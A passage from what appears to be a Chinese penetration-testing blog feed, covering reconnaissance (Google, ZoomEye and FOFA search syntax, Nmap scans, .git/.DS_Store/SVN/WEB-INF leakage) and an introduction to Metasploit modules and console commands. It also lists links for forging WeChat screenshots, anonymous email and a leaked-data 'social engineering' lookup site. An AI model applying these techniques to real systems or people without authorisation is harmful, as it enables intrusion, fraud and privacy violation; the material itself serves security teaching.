class="exturl"><a class="exturl__link" href="http://www.hacked.com.cn/">http://www.hacked.com.cn/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li></ol>        <h3 id="1-7-5-社工库">          <a href="#1-7-5-社工库" class="heading-link"><i class="fas fa-link"></i></a>1.7.5.社工库</h3>      <ol><li>微信伪造：<span class="exturl"><a class="exturl__link" href="http://www.jietuyun.com/">http://www.jietuyun.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>任意邮箱发送：<span class="exturl"><a class="exturl__link" href="http://tool.chacuo.net/mailanonymous">http://tool.chacuo.net/mailanonymous</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 和 <span class="exturl"><a class="exturl__link" href="https://emkei.cz/">https://emkei.cz/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>临时邮箱：<span class="exturl"><a class="exturl__link" href="http://www.yopmail.com/">http://www.yopmail.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>邮箱池群：<span class="exturl"><a class="exturl__link" href="http://veryvp.com/">http://veryvp.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>社工库：<span class="exturl"><a class="exturl__link" href="http://www.uneihan.com/">http://www.uneihan.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li></ol>        <h2 id="1-8-Google-Hack">          <a href="#1-8-Google-Hack" class="heading-link"><i class="fas fa-link"></i></a>1.8. Google Hack</h2>              <h3 id="1-8-1-实战">          <a href="#1-8-1-实战" class="heading-link"><i class="fas fa-link"></i></a>1.8.1.实战</h3>      <p>Google搜索引擎之所以强大，关键在于它详细的搜素关键词，以下是几个常用的搜素关键词: (更多详细教里，参见：<span class="exturl"><a class="exturl__link" href="http://user.qzone.qq.com/568311803/main)%E3%80%82">http://user.qzone.qq.com/568311803/main)。</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><ol><li>inurl:用于搜索网页上包含的URL，这个语法对寻找网页上的搜索，帮助之类的很有用。</li><li>intext:只搜索网页部分中包含的文字(例如：管理后台，也就是忽略了标题， URL等的文字) </li><li>site:可以限制你搜索范围的域名</li><li>filetype:搜索文件的后级或者扩展名</li><li>intitle:限制你搜索的网页标题</li><li>allintitle:搜索所有关键字构成标题的网页，但是推荐不要使用。</li><li>link:可以得到一个所有包含了某个指定URL的页面列表，例如： link :www. google. com就可以得到所有连接到Google的页面。</li></ol>        <h2 id="1-9-Nmap-端扫">          <a href="#1-9-Nmap-端扫" class="heading-link"><i class="fas fa-link"></i></a>1.9 Nmap 端扫</h2>      <p>功能介绍：<span class="exturl"><a class="exturl__link" href="http://blog.sina.com.cn/s/blog_811d9fdd0101ey07.html">http://blog.sina.com.cn/s/blog_811d9fdd0101ey07.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> </p><p>10种扫描解释：<span class="exturl"><a class="exturl__link" href="http://www.cnblogs.com/c4isr/archive/2012/12/07/2807491.html">http://www.cnblogs.com/c4isr/archive/2012/12/07/2807491.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>  </p>        <h3 id="1-9-1-功能介绍">          <a href="#1-9-1-功能介绍" class="heading-link"><i class="fas fa-link"></i></a>1.9.1 功能介绍</h3>      <p>Nmap 是一个网路连接端口扫描软件，用来扫描网上电脑开放的网络连接端口，确定哪些服务器运行在哪些连接端口，并且推断计算机运行哪个操作系统。它是网络管理员必用的软件之一，以及用以评估网络系统安全。</p><p><strong>功能架构图：</strong></p><p>主机发现 —&gt; 端口扫描 —&gt; 版本侦测 —&gt; OS 侦测</p>        <h3 id="1-9-2-主机发现">          <a href="#1-9-2-主机发现" class="heading-link"><i class="fas fa-link"></i></a>1.9.2.主机发现</h3>      <p><strong>1）主机发现原理：</strong></p><p>主机发现的原理和ping 命令类似，发送探测包给目标主机，如果收到回复，说明目标主机是开启的。Nmap 支持十多种不同的主机探测方式，比如：发送 ICMPECHO / TIMESTAMP / NETMASK 报文，发送 SCTP INIT / COOKIE-ECHO 包，用户可以在不同的条件下灵活选用不同的方式来探测目标主机。</p><p><strong>2）主机发现的基本用法：</strong></p><ol><li>-sL：List Scan 列表扫描，仅将指定的目标的 IP 列举出来，不进行主机发现。</li><li>-sn：Ping Scan 只进行主机发现，不进行端口扫描</li><li>-Pn：将所有指定的主机视作开启的，跳过主机发现的过程。</li><li>-PS/PA/PU/PY[portlist]：使用 TCPSYN / ACK 或 SCTP INIT / ECHO 方式进行发现。</li><li>-PE/PP/PM：使用 ICMP echo ，timestamp，and netmask 请求包发现主机。</li><li>-PO[protocollist]：使用 IP 协议包探测对方主机是否开启。</li><li>-n/-R：-n表示不进行 DNS 解析，-R表示总是进行 DNS 解析。</li><li>–dns-servers &lt;serv1[,serv2],…&gt;：指定 DNS 服务器。</li><li>–system-dns：指定使用系统的 DNS 服务器。</li><li>–traceroute：追踪每个路由结点。</li></ol><p><strong>3）使用演示：</strong></p><p>扫描局域网 192.168.0.1-192.168.0.250 范围内哪些 IP 的主机是活动的。</p><p>命令如下：nmap -sn 192.168.0.1-250</p>        <h3 id="1-9-3-端口扫描">          <a href="#1-9-3-端口扫描" class="heading-link"><i class="fas fa-link"></i></a>1.9.3. 端口扫描</h3>      <p>端口扫描时 Nmap 最基本核心的功能，用于确定目标主机的 TCP / UDP 端口开放情况。默认情况下，Nmap 会扫描1000 个最有可能开放的 TCP 端口。Nmap 通过探测将端口划分为6个状态。</p><ol><li>open：端口是开放的。</li><li>closed：端口是关闭的。</li><li>filtered：端口被防火墙 IDS / IPS 屏蔽，无法确定其状态。</li><li>unfiltered：端口没有被屏蔽，但是否开放还需进一步确定。</li><li>open|filtered：端口是开放的或者是屏蔽的。</li><li>closed|filtered：端口是关闭的或者是屏蔽的。</li></ol><p><strong>1）端口扫描方面非常强大的，提供了很多的探测方式。</strong></p><ol><li>TCP SYN scanning</li><li>TCP connect scannin</li><li>TCP ACK scanning</li><li>TCP FIN/Xmas/NULL scanning</li><li>UDP scanning</li><li>其他方式</li></ol><p><strong>2）端口扫描用法：</strong></p><ol><li>-sS/sT/sA/sW/sM：指定使用 TCP SYN/Connect()/ACK/Window/Maimon scans 的方式来对目标主机进行扫描。</li><li>-sU：指定使用 UDP 扫描方式确定目标主机的 UDP 端口状态。</li><li>-sN/sF/sX：指定使用 TCP Null，FIN，and Xmas scans 秘密扫描方式来协助探测对方的 TCP 端口状态。</li><li>–scanflags <flags>：定制 TCP 包的 flags。</flags></li><li>-sI &lt;zombiehost[:probeport]：指定使用 idle scan 方式来扫描目标主机（前提需要找到合适的 zombie host）。</li><li>-sY/sZ：使用 SCTP INIT/COOKIE-ECHO 来扫描 SCTP 协议端口的开放情况。</li><li>-sO：使用 IP protocol 扫描确定目标主机支持的协议类型。</li><li>-b <FTP relay host>：使用 FTP bounce scan 扫描方式。</FTP></li></ol><p><strong>3）使用演示：</strong></p><p>在此，我们以主机 192.168.0.100 为例。</p><p>命令如下：nmap -sS -sU -T4 -top-ports 300 192.168.0.100</p>        <h3 id="1-9-4-版本侦测">          <a href="#1-9-4-版本侦测" class="heading-link"><i class="fas fa-link"></i></a>1.9.4. 版本侦测</h3>      <p><strong>1）版本侦测原理：</strong></p><p>简要地介绍版本的侦测原理。版本 侦测主要分为以下几个步骤：</p><ol><li>首先检查 open 与 open|filtered 状态的端口是否在排除端口列表内，如果在排除列表，将该端口剔除。</li><li>如果是 TCP 端口，尝试建立 TCP 连接。尝试等待片刻（通常6秒或者更久，具体时间可以查询文件 nmap-services-probes 中 Probe TCP NULL q|| 对应的 totalwaitms）。通常在等待时间内，会接收到目标主机发送的 “WelcomeBanner” 信息。nmap 将接收到的 Banner 与 nmap-services-probes 中 NULL probe 中的签名进行对比。查找对应应用程序的名字与版本信息。</li><li>如果通过 “Welcome Banner” 无法确定应用程序版本，那么 nmap 再尝试发送其他的探测包（即从nmap-services-probes 中挑选合适的 probe），将 probe 得到回复包与数据库中的签名进行对比。如果反复探测都无法得出具体应用，那么打印应用返回报文，让用户自行进一步判定。</li><li>如果是 UDP 端口，那么直接使用 nmap-services-probes 中探测包进行探测匹配。根据结果对比分析出 UDP 应用服务类型。</li><li>如果探测到应用程序是 SSL ，那么调用 openSSL 进一步的侦查运行在 SSL 之上的具体的应用类型。</li><li>如果探测到应用程序是 SunPRC，那么调用 brute-force RPC grinder 进一步探测具体的服务。</li></ol><p><strong>2）版本侦测用法：</strong></p><ol><li>–version-light：指定使用轻量侦测方式。</li><li>–version-all：尝试使用所有的 probe 进行侦测。</li><li>–version-trace：显示出详细的版本侦测过程信息。</li></ol><p><strong>3）使用演示：</strong></p><p>对主机 192.168.0.100 进行版本侦测</p><p>命令如下：nmap -sV 192.168.0.100</p>        <h3 id="1-9-5-OS-侦测">          <a href="#1-9-5-OS-侦测" class="heading-link"><i class="fas fa-link"></i></a>1.9.5. OS 侦测</h3>      <p><strong>1）OS 侦测原理：</strong></p><p>Nmap 使用 TCP/IP 协议栈指纹来识别不同的操作系统和设备。在RFC 规范中，有些地方对 TCP/IP 的实现并没有强制规定，由此不同的 TCP/IP 方案中有可能都有自己的特定方式。Nmap 主要是根据这些细节上的差异来判断操作系统的类型的。</p><p>具体实现方式如下：</p><p>Nmap 内部包含了2600多已知系统的指纹特征（在文件 nmap-os-db 文件中）。将此指纹数据库作为进行指纹对比的样本库。分别挑选一个 open 和 closed 的端口，向其发送经过精心设计的 TCP/UDP/ICMP 数据包，根据返回的数据包生成一份系统指纹。将探测生成的 指纹与 nmap-os-db 中指纹进行对比，查找匹配的系统。如果无法匹配，以概率形式列举出可能的系统。</p><p><strong>2）OS 侦测用法：</strong></p><ol><li>-O：指定 Nmap 进行 OS 侦测。</li><li>–osscan-limit：限制 Nmap 只对确定的主机进行 OS 探测（至少需确知该主机分别有一个 open 和 closed 的端口）。</li><li>–osscan-guess：大胆猜测对方的主机的系统类型。由此准确性会下降不少，但是会尽可能多为用户提供潜在的操作系统。</li></ol><p><strong>3）使用演示：</strong></p><p>命令：nmap -O 192.168.0.100</p>        <h2 id="1-10-扩展-BurpAPP-抓包">          <a href="#1-10-扩展-BurpAPP-抓包" class="heading-link"><i class="fas fa-link"></i></a>1.10 扩展 BurpAPP 抓包</h2>      <p><strong>一. 手机端配置：</strong></p><ol><li><p>让安卓手机和电脑连入同一个WIFI ，即是在同一个无线局域网下。</p></li><li><p>查看电脑的IP，本地输入：ipconfig</p></li><li><p>设置手机代理 IP，将手机的代理IP 设置的和电脑 wifi 的IP一致，</p><p>代理设置为 手动，设置主机名为电脑无线局域网IP，端口可以随便设置（如：8080），其他的设置默认。</p></li></ol><p><strong>二. 电脑端配置：</strong></p><ol><li>打开 Burpsuite ,设置代理代理服务器，设置的IP 和端口要和 手机上设置的一致</li></ol>        <h2 id="1-11-扩展-常见信息泄露利用方法">          <a href="#1-11-扩展-常见信息泄露利用方法" class="heading-link"><i class="fas fa-link"></i></a>1.11. 扩展:常见信息泄露利用方法</h2>              <h3 id="1-11-1-Git-导致文件泄露">          <a href="#1-11-1-Git-导致文件泄露" class="heading-link"><i class="fas fa-link"></i></a>1.11.1. Git 导致文件泄露</h3>      <p>由于目前的web项目的开发采用前后端完全分离的架构:前端全部使用静态文件，和后端代码完全分离，隶属两个不同的项目。表态文件使用git 来进行同步发布到服务器，然后使用nginx指向到指定目录，以达到被公网访问的目的。</p><p>在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p><p>例如：192.168.133.130/zvuldrill-git/.git/config</p>        <h3 id="1-11-2-DS-store-导致文件泄露">          <a href="#1-11-2-DS-store-导致文件泄露" class="heading-link"><i class="fas fa-link"></i></a>1.11.2. DS_store 导致文件泄露</h3>      <p>Ds_store 是 Mac 下 Finder 用来保存如何展示文件/文件夹的数据文件，每个文件下对应一个。由于开发/设计成员在发布代码时未删除文件夹中隐藏的 Ds_store ，可能造成文件目录结构泄露，源代码文件等敏感信息的泄露。</p><p>我们可以模仿一个环境，利用 phphstudy 搭建 PHP 环境，把 Ds_store 文件传到相关的目录，然后利用工具进行相关检测。</p><p>工具：ds_store_exp，下载地址：<span class="exturl"><a class="exturl__link" href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>为了让实验显得更加真实，我们在本地搭建环境，然后建立一个 admin 和 hello 文件夹，利用该工具运行完成后，查看工具文件夹有什么结果。</p><p>这是一个.DS_Store文件泄漏利用脚本，它解析.DS_Store文件并递归下载文件到本地。</p>        <h3 id="1-11-3-SVN-导致文件泄露">          <a href="#1-11-3-SVN-导致文件泄露" class="heading-link"><i class="fas fa-link"></i></a>1.11.3. SVN 导致文件泄露</h3>      <p>Subversion.简称svn ,是一个开放源代码的版本控制系统，相对于的 RCS, CVS，采用了分支管理系统，它的设计目标就是取代cvs，互联网上越来越多的控制服务从cvs 转移到Subversion。</p><p>Subversion使用服务端–客户端的结构 ，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射时(称为“工作副本”)。在这两端之间是通过各种仓库存取层(Repository Acess，简称RA)的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP，SSH等，或本地文件的方式来对仓库进行操作。</p><p>SVN 漏洞在实际渗透测试过程中，利用到也比较多，由于一些开发管理员疏忽造成，原理类似DS_Store漏洞。我们这里不再进行搭建环境，给大家推荐工具.利用方法如下:</p><ol><li>漏洞利用工具: Seay-SVN 漏洞利用工具。</li><li>添加网站 url</li><li>在被利用的网址后面加 /.svn/entries，列出网站目录，甚至载整站。</li></ol>        <h3 id="1-11-4-WEB-INF-web-xml-泄露">          <a href="#1-11-4-WEB-INF-web-xml-泄露" class="heading-link"><i class="fas fa-link"></i></a>1.11.4. WEB-INF/web.xml 泄露</h3>      <p>WEB-INF 是Java的WEB应用的安全目录，如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p><p>WEB-INF主现包含一下文件或目录。</p><p>/WEB-INF/web.xml: Web 应用程序配置文件，描述了servlet 和其他的应用组件配置及命名规则。</p><p>/WEB-INF/classes/:包含了站点所有用的class 文件，包括servlet class 和非servlet class，他们不能包含在 jar 文件中。</p><p>/WEB-INF/lib/: 存放web应用需要的各种JAR文件。放置仅在这个应用中要求使用的jar文件，如数据库驱动 jar 文件。</p><p>/WEB-INF/src/: 源码目录，按照包名结构放置各个java文件。</p><p>/WEB-INF/database.properties: 数据库配置文件。</p><p><strong>原因:</strong></p><p>通常一些web应用我们会使用多个web服务器搭配使用,解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等， 在使用这种架构的时候，由于对静态资源目录或映射文件配置不当，可能会引发一些安全问题，导致 web.xml 等文件能够被读取。</p>        <h2 id="1-12-扩展-ZoomEye-hack">          <a href="#1-12-扩展-ZoomEye-hack" class="heading-link"><i class="fas fa-link"></i></a>1.12 扩展: ZoomEye hack</h2>      <p>ZoomEye支持公网设备指纹检素和Web指纹检索的网站，指纹检索包括应用名称，版本，前端框架，后端框架，服务端语言、服务器操作系统，网站容器，内容管理系统和数据库等.</p><p>设备指纹包括：应用名、版本开放端口，操作系统，服务名，地理位置等。</p><p><strong>实战搜索</strong><br>我们今天主要讲下如何使用他的语法规则去高级搜索，搜索有用信息。</p><p>主机设备搜索组件名称。</p><ol><li>app：组件名</li><li>ver：组件版本</li></ol><p>例1：搜索使用iis6.0主机：app:”Microsoft-IIS” ver”6.0”,可以看到0.6秒搜索到41,781,210左右的使用iis6.0的主机。</p><p>例2：搜索使weblogic主机： app: “weblogic httpd” port: 7001 ,可以看到0.078秒搜索到42万左右的使用weblogic的主机。(反序列化漏洞)</p><p>例3：查询开放3389端口的主机： port : 3389</p><p>例4：查询操作系统为Linux系统的服务器， os:linux</p><p>例5：查询公网摄像头： service:”routersetup”</p><p>例6：搜索美国的Apache 服务器：app: Apache country:US ，后面还可以接 city</p><p>例7：搜索指定IP信息：ip:121.42.173.26</p><p>例8：查询 taobao.com 有关域名信息：site:taobao.com</p><p>例9：搜索标题中包含该字符的网站：title:weblogic</p><p>例10：keywords:Nginx</p>        <h2 id="1-13-扩展：fofa-hack">          <a href="#1-13-扩展：fofa-hack" class="heading-link"><i class="fas fa-link"></i></a>1.13. 扩展：fofa hack</h2>      <p>domin=”” || ip=”” || host=”” || title=”” || header=”” ;</p><p>protocol=”https”，搜索指定协议类型</p><p>app=”phpinfo”，搜索某些组件相关系统</p><p>host=”baidu.com”，搜索包含有特定字符的 URL</p><p>title=”powered by” &amp;&amp; os=windows 搜索网页标题中包含有特定字符并且系统是 windows 的网页</p><p>详细看官方详细文档：<span class="exturl"><a class="exturl__link" href="https://fofa.so/help_articles/">https://fofa.so/help_articles/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>​    </p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF框架</title>
      <link href="2020/07/04/MSF/"/>
      <url>2020/07/04/MSF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h1 id="一-初识-MSF">          <a href="#一-初识-MSF" class="heading-link"><i class="fas fa-link"></i></a>一.初识    MSF</h1>              <h2 id="1-1什么是Metasploit">          <a href="#1-1什么是Metasploit" class="heading-link"><i class="fas fa-link"></i></a>1.1什么是Metasploit</h2>      <p>Metasploit就是个漏洞框架。 它的全称叫做The Metasploit Framework ,简称MSF。是一个免费、可下载的框架,通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。当H.D. Moore在2003年发布MSF时,计算机安全状况也被永久性地改变了。仿佛一夜之间， 任何人都可以成为黑客,每个人都可以使用攻击工具来攻击那些未打过补丁或者刚刚打过补J的漏洞。软件厂商再也不能推迟发布针对已公布漏洞的补丁了，这是因为MSF团队一直都在努力开发各种攻击工具,并将它们贡献给所有MSF用户。<br>MSF的设计初衷是打造成一个攻击工具开发平台 ,然而在目前情况下,安全专家以及业余安全爱好者更多地将其当作种点几下 鼠标就可以利用其中附带的攻击工具进行成功攻击的环境。</p><a id="more"></a>        <h2 id="1-2MSF专业术语讲解">          <a href="#1-2MSF专业术语讲解" class="heading-link"><i class="fas fa-link"></i></a>1.2MSF专业术语讲解</h2>              <h3 id="1-2-1渗透攻击-Exploit">          <a href="#1-2-1渗透攻击-Exploit" class="heading-link"><i class="fas fa-link"></i></a>1.2.1渗透攻击(Exploit)</h3>      <p>渗透攻击是指由攻击者或者渗透测试者利用系统、应用或服务中的安全漏洞，所进行的攻击行为。<br>流行的攻击技术包括:缓冲区溢出、Web应用程序漏洞攻击,以及利用配置错误等。</p>        <h3 id="1-2-2攻击载荷-Payload">          <a href="#1-2-2攻击载荷-Payload" class="heading-link"><i class="fas fa-link"></i></a>1.2.2攻击载荷(Payload)</h3>      <p>攻击载何是我们期望目标系统在被渗透攻击后而执行的代码，在框架中可以自由的选择、传送和植入。比如，反弹式shell 是一种从目标主机到攻击主机创建网络连接,并提供命令行shell 的攻击载荷。bind shell 攻击载荷则在目标主机上将命令行shell 绑定到一个打开的监听端口,攻击者可以连接这些端口来取得shell交互。</p>        <h3 id="1-2-3溢出代码-Shellcode">          <a href="#1-2-3溢出代码-Shellcode" class="heading-link"><i class="fas fa-link"></i></a>1.2.3溢出代码(Shellcode)</h3>      <p>shellcode是在渗透攻击时作为攻击载荷运行的一组机器指令。shellcode通常用汇编语言编写。在大多数情况下,目标系统执行了shellcode这一组指令后 才会提供一个命令行shell或者Meterpreter shell ,这也是shellcode名称的由来。</p>        <h3 id="1-2-4模块-Module">          <a href="#1-2-4模块-Module" class="heading-link"><i class="fas fa-link"></i></a>1.2.4模块( Module)</h3>      <p>在MSF中，一个模块是指MSF框架中所使用的一段软件代码组件。在某些时候,你可能会使用一个渗透攻击模块( Exploit module ).也就是用于实际发起渗透攻击的软件组件。而在其它时候，则可能使用个辅助模块( auxiliary module ).用来扫描一些诸如扫描或系统查点的攻击动作。</p>        <h3 id="1-2-5监听器-Listener">          <a href="#1-2-5监听器-Listener" class="heading-link"><i class="fas fa-link"></i></a>1.2.5监听器(Listener)</h3>      <p>监听器是MSF中用来等待连入网络连接的组件。举例来说,在目标主机被渗透攻击之后，它可能会通过互联网回连到攻击主机上，而监听器组件在攻击主机上等待被渗透攻击的系统来连接，并负责处理这些网络连接。</p>        <h1 id="二-更新MSF以及目录结构">          <a href="#二-更新MSF以及目录结构" class="heading-link"><i class="fas fa-link"></i></a>二.更新MSF以及目录结构</h1>              <h2 id="2-1-如何更新MSF">          <a href="#2-1-如何更新MSF" class="heading-link"><i class="fas fa-link"></i></a>2.1.如何更新MSF</h2>      <p>首先，替换源，可以换成阿里源，将原本的源用#注释掉，因为国内访问它的源太慢。</p><p>然后，添加数字签名。</p><p>有时候会出现故障，就得把老的MSF卸载：apt remove metasploit-framework</p><p>更新命令：apt-get update（这些都是在msf中执行的命令）</p><p>安装MSF框架：apt-get install metasploit-framework</p><p>进入msf：msfconsole</p><p>若提示没有相应的数据库支持：quit (退出msf)</p><p>启动数据库：systemctl start postgresql</p><p>允许开机自启：systemctl enable postgresql</p><p>构建数据库缓存：msfdb init</p>        <h2 id="2-2-MSF的目录结构">          <a href="#2-2-MSF的目录结构" class="heading-link"><i class="fas fa-link"></i></a>2.2.MSF的目录结构</h2>      <p>MSF 在BT5下存放目录：/opt/MSF</p><p>MSF 在kali 下存放目录：/usr/share/metasploit-framework/</p>        <h2 id="2-3-Modules-模块">          <a href="#2-3-Modules-模块" class="heading-link"><i class="fas fa-link"></i></a>2.3.Modules(模块)</h2>      <p>存放路径：/usr/share/metasploit-framework/modules/(个人写的模块也可以存放在这里)</p>        <h3 id="2-3-1-Auxiliary">          <a href="#2-3-1-Auxiliary" class="heading-link"><i class="fas fa-link"></i></a>2.3.1.Auxiliary</h3>      <p>主要包含渗透测试中一些辅助性的脚本，这些即本功能有扫描，嗅探，破解，注入，漏洞挖掘等。</p>        <h3 id="2-3-2-Encoders">          <a href="#2-3-2-Encoders" class="heading-link"><i class="fas fa-link"></i></a>2.3.2.Encoders</h3>      <p>各种编码工具用于躲过入侵检测和过滤系统。</p>        <h3 id="2-3-3-Exploits">          <a href="#2-3-3-Exploits" class="heading-link"><i class="fas fa-link"></i></a>2.3.3.Exploits</h3>      <p>主要包含了传说中的exp、0day. 各种漏洞利用的脚本。主要的攻击代码全在这，这里边包含的exp的路径的命名规则是系统/服务/模块，在使用exp是可以根据这个命名方法来找(也可以用search这条指令来找)比如:use exploits/windows(系统)/vnc(服务)/realvnc_client(模块名)</p>        <h3 id="2-3-4-Nops">          <a href="#2-3-4-Nops" class="heading-link"><i class="fas fa-link"></i></a>2.3.4.Nops</h3>      <p>NOP (No Operation or Next Operation) sled,由于IDS/IPS会检查数据包中不规则的数据，所以在某些场合下(比如针对溢出攻击),某些特殊的滑行字符串(NOPS x90x9…)则会因为被拦截而导致攻击失效，所以此时需要修改exploit中的NOPs.nops文件夹下的东西会在payload生成时用到(后面会有介绍)。比如我们打开php的NOPS生成脚本,就会发现它只是返回了指定长度的空格而已。(不理解没关系)。</p>        <h3 id="2-3-5-Payloads">          <a href="#2-3-5-Payloads" class="heading-link"><i class="fas fa-link"></i></a>2.3.5.Payloads</h3>      <p>这个单词翻译过来叫载荷:是攻击者发送给系统执行的指令(不包含exploits 攻击阶段) , payloads主要是在目标机执行的,而exploits是在本地机执行作用于目标机。命名规则是:系统/类型/名称比如: use payloads/windows/shell/bind_tcp.</p>        <h3 id="2-3-6-Post">          <a href="#2-3-6-Post" class="heading-link"><i class="fas fa-link"></i></a>2.3.6.Post</h3>      <p>这个目录里放着msf的exploits执行成功后,向目标机发送的一些功能性指令,比如:提权,获取hash等。</p>        <h3 id="2-3-7-Data">          <a href="#2-3-7-Data" class="heading-link"><i class="fas fa-link"></i></a>2.3.7.Data</h3>      <p>这个目录里盛放了Meterpreter、PassiveX、 Vnc、 DLLS 等这些工具和一些用户接口代码, Msfweb和一些其他模块用到的数据文件。</p><p>Data下js文件夹下的Detect ,这里面存放的是MSF的探针文件。如果看过MSF浏览器攻击脚本的代码,就会发现调用了一个js库，然后检查当前请求是否符合被攻击环境。如果符合则发送攻击代码,否则中断。Memory中主要是一些堆喷射代码。 在大部分浏览器漏洞利用过程,堆喷射是一个不可或缺的过程(当然不是绝对的! )。并且不同的浏览器及版本间,堆喷射代码都有所不同。</p>        <h3 id="2-3-8-Plugins">          <a href="#2-3-8-Plugins" class="heading-link"><i class="fas fa-link"></i></a>2.3.8.Plugins</h3>      <p>这里的模块用户需要使用load来加载提供数据库连接插件和各种要用到的插件。</p>        <h3 id="2-3-9-Scripts">          <a href="#2-3-9-Scripts" class="heading-link"><i class="fas fa-link"></i></a>2.3.9.Scripts</h3>      <p>这个目录下的文件大都是Meterpreter这个模块利用的脚本，比如Meterpreter里用到的migrate来转移到其他进程的指令的源代码就在这个目录下。</p><p>这里的rc脚本相当于Windows下的批处理脚本, 在某些情况下会有一定便捷性。比如Veil 在生成免杀payload的同时也会生成一个rc脚本，此时使用msfconsole -r xx.rc便可以快速的建立一个和payload对应的handler ,亦或在攻击过程中需要你反复的set exploit,那么就可以使用这个批处理脚本了,而这个目录下则是一些给定的rc脚本,虽然你可能不习惯这样使用,但作为改写自己的rc脚本的资源也不错。</p>        <h3 id="2-3-10-TOOLS">          <a href="#2-3-10-TOOLS" class="heading-link"><i class="fas fa-link"></i></a>2.3.10.TOOLS</h3>      <p>包含一些有用的脚本和零散的工具。</p>        <h1 id="三-MSF基本命令">          <a href="#三-MSF基本命令" class="heading-link"><i class="fas fa-link"></i></a>三.MSF基本命令</h1>              <h2 id="3-1-Msfconsole控制台">          <a href="#3-1-Msfconsole控制台" class="heading-link"><i class="fas fa-link"></i></a>3.1.Msfconsole控制台</h2>      <p>它是一个一体化集中控制台，允许你访问到几乎所有的MSF框架选项。MSF起初看似吓人的,但一旦你学习他的语法命令,你将会欣赏利用该接的力量。</p>        <h2 id="3-2-Msfconsole的好处">          <a href="#3-2-Msfconsole的好处" class="heading-link"><i class="fas fa-link"></i></a>3.2.Msfconsole的好处</h2>      <p>这是唯一能访问大多数支持在MSF特点。</p><p>Console- based界面提供了一个框架。</p><p>具有最稳定的MSF界面。</p><p>充分支持Readline，Tabbing以及其他各类命令。</p><p>支持Msfconsole外部命令执行。</p>        <h2 id="3-3-Msfconsole命令">          <a href="#3-3-Msfconsole命令" class="heading-link"><i class="fas fa-link"></i></a>3.3.Msfconsole命令</h2>      <p>？：命令帮助，可以使用的命令</p><p>在？后面加命令(和前面的？有空格)：可以解释该命令的含义</p><p>search：搜索模块名和描述</p><p>use：+模块路径和模块本身  -&gt;使用该模块</p><p>进入模块：info -&gt; 查阅该模块信息      / check  -&gt;   检测</p><p>back：从当前环境（模块环境）返回 ，返回到上一级目录（类似于 .. )</p><p>banner：显示MSF的banner的信息</p><p>color：颜色转换</p><p>connect：+IP地址或者域名+端口号   -&gt; 连接主机</p><p>exit/quit：退出MSF</p><p>irb：进入irb脚本模式</p><p>jobs：显示和管理作业（和windows下的任务管理器的进程作用一样）</p><p>kill：+进程名字 -&gt; 杀死一个作业（和结束进程作用一样）</p><p>loadpath：加载一个模块的路径</p><p>load：加载一个插件</p><p>upload：卸载一个模块</p><p>resource：运行储存一个文件中的命令</p><p>route：查看一个会话的路由信息</p><p>save：保存动作</p><p>set：给一个变量赋值   （如：set RHOST 192.168.133.133)</p><p>unset：解除一个或多个变量</p><p>setg：把一个赋值给全局变量，例如上述的set 设置的IP，就会用到其他攻击模块的RHOST中。</p><p>unsetg：解除一个或多个全局变量</p><p>sleep：在限定秒数内什么也不做</p><p>show：显示所有类型的模块</p><p>version：显示MSF和控制台库的版本</p>        <h1 id="四-Exploits-And-Payloads-模块">          <a href="#四-Exploits-And-Payloads-模块" class="heading-link"><i class="fas fa-link"></i></a>四.Exploits And Payloads 模块</h1>      <p>show + 模块名(s) -&gt; 查看该模块下可以使用的</p>        <h2 id="4-1-Exploits-模块">          <a href="#4-1-Exploits-模块" class="heading-link"><i class="fas fa-link"></i></a>4.1.Exploits 模块</h2>      <p>命名规则:系统/服务/名称<br>例如: windows/smb/ms08_067_netapi </p><p>RHOST :目标主机IP地址</p><p>RPORT :目标主机连接端口。</p><p>Payload :有效的载荷,成功后返回shell.</p><p>LHOST :攻击者的IP地址（我们自己就是攻击者）</p><p>LPORT :攻击者的端口</p><p>SRVHOST：攻击者自己搭建的服务器的IP地址</p><p>SRVPORT：攻击者自己搭建的服务器的端口号</p><p>SSL：证书</p><p>URIPATH：路径</p>        <h2 id="4-2-Payloads-模块">          <a href="#4-2-Payloads-模块" class="heading-link"><i class="fas fa-link"></i></a>4.2.Payloads 模块</h2>      <p>是在使用一个模块之后再去使用的。</p><p>命名规则:系统/类型/名称<br>例如: Windows/dllinject/reverse tcp.</p><p>类型命名规则<br>shell：上传一个shell,。<br>dllinject：注入一个dll到进程。<br>patchup*** ：修补漏洞。。<br>upexec：上传并执行一个文件。<br>meterpreter ：高级的payload。<br>vncinject ：高级的payload。<br>passive ：高级的payload。</p><p>名称的命名规则<br>shell find tag在一个已建立的连接上创建一个shell,<br>shell 